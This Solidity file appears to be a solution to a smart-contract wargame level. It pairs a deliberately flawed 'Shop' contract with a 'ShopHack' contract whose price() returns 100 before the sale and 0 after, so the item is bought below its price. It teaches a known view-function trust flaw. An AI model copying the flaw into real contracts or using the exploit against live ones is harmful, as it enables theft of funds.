// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;


interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopHack is Buyer {

    Shop shopContract;
    constructor(address _shop) {
        shopContract = Shop(_shop);
    }

    function buy() public {
        shopContract.buy();
    }


    function price() external view returns (uint) {
        return shopContract.isSold() ? 0:100;
    }
}
